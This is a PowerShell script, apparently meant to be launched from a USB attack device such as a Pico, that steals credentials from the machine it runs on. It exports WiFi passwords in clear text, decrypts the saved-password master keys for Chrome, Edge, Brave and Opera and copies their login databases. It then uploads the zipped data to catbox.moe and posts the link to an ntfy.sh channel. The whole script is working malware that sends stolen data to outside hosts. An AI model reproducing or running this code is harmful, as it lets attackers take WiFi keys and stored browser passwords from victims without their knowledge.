$topic = "data_stwealer_hideen_"
Write-Host "=== [ ULTRA LOOTER v2: INSTANT DECRYPT ] ===" -ForegroundColor Cyan

# 1. Setup
$dir = "$env:TEMP\LootBox"; $zip = "$env:TEMP\package.zip"
if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }; mkdir $dir | Out-Null

# 2. WiFi
Write-Host "[*] Exporting WiFi..."
netsh wlan export profile folder=$dir key=clear | Out-Null

# 3. Chromium Decryption (The Master Key)
$chromes = @{
    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
    "Opera"   = "$env:APPDATA\Opera Software\Opera Stable\Local State"
}

Write-Host "[*] Unlocking Master Keys..." -ForegroundColor White
foreach ($browser in $chromes.Keys) {
    $path = $chromes[$browser]
    if (Test-Path $path) {
        try {
            # Extract and Decrypt the Key using the current User's credentials
            $json = Get-Content $path -Raw | ConvertFrom-Json
            $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length-1)], $null, 'CurrentUser')
            
            # Save the raw HEX key to a file for you
            [System.BitConverter]::ToString($masterKey) -replace '-' | Out-File "$dir\$browser`_MasterKey.txt"
            
            # Also copy the Login Data DB
            $dbPath = $path.Replace("Local State", "Default\Login Data")
            if ($browser -like "Opera*") { $dbPath = $path.Replace("Local State", "Login Data") }
            if (Test-Path $dbPath) { Copy-Item $dbPath -Destination "$dir\$browser`_LoginData" -Force }
            
            Write-Host "    [+] $browser Unlocked!" -ForegroundColor Green
        } catch { Write-Host "    [-] Failed $browser" -ForegroundColor Red }
    }
}

# 4. Zip & Upload
Write-Host "[*] Uploading Loot..." -ForegroundColor Yellow
Add-Type -Assembly "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)

$link = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php

if ($link -like "http*") {
    Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot: $link"
    Write-Host "[!] SUCCESS: $link" -ForegroundColor Green
    
    # --- THE SIGNAL ---
    # Find Pico and send 'F' for Finished
    $portName = (Get-PnpDevice -FriendlyName "USB Serial Device*" -Status OK).Caption | Select-String -Pattern "COM(\d+)" | ForEach-Object { $_.Matches.Value }
    if ($portName) {
        $port = New-Object System.IO.Ports.SerialPort $portName, 9600, None, 8, one
        $port.Open(); $port.Write("F"); $port.Close()
    }
}

Write-Host "`n=== DEBUG FINISHED ===" -ForegroundColor Cyan
Read-Host "Press Enter to cleanup..."
Remove-Item -Recurse -Force $dir, $zip
